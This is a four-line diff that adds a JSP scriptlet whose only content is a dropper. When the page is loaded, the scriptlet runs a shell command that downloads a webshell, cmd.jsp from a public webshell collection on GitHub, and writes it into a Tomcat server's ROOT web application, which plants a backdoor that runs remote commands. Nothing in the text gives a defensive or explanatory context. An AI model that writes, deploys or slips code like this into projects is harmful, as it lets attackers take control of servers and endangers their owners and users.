@@ -1,0 +1,4 @@
+<%
+    String[] cmd = {"/bin/sh", "-c", "wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp -O /usr/local/tomcat/webapps/ROOT/cmd.jsp"};
+    Runtime.getRuntime().exec(cmd); 
+%>
